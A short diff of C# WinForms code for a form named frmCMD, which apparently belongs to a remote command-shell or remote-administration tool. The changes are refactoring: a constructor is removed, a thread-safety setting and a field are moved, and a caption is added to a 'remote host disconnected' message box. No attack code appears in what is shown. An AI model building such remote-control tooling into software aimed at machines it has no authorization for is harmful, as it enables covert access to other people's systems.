@@ -15,17 +15,13 @@ namespace V4mp1r3
 {
     public partial class frmCMD : Form
     {
-        public frmCMD()
-        {
-            InitializeComponent();
-            CheckForIllegalCrossThreadCalls = false;
-        }
-        TcpClient client;
         public frmCMD(TcpClient client)
         {
             InitializeComponent();
+            CheckForIllegalCrossThreadCalls = false;
             this.client = client;
         }
+        TcpClient client;
         private void button1_Click(object sender, EventArgs e)
         {
             Thread thread1 = new Thread(new ThreadStart(CMD));
@@ -45,7 +41,7 @@ namespace V4mp1r3
             }
             catch
             {
-                MessageBox.Show("远程已主机断开连接！");
+                MessageBox.Show("远程已主机断开连接！", "提示");
             }
         }
 
